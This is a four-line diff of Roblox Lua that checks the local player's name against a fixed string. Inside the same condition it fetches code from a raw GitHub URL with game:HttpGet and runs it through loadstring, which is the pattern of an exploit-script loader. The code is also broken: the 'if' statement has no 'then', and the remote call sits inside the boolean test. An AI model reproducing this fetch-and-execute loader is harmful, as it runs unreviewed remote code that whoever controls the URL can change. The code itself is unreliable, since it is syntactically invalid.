@@ -1,0 +1,4 @@
+local key = game.Players.LocalPlayer.Name
+if key == "icantcompriehaned" or
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/souls00001/Uehbfyubefbe7fybe/main/Anything"))()
+end
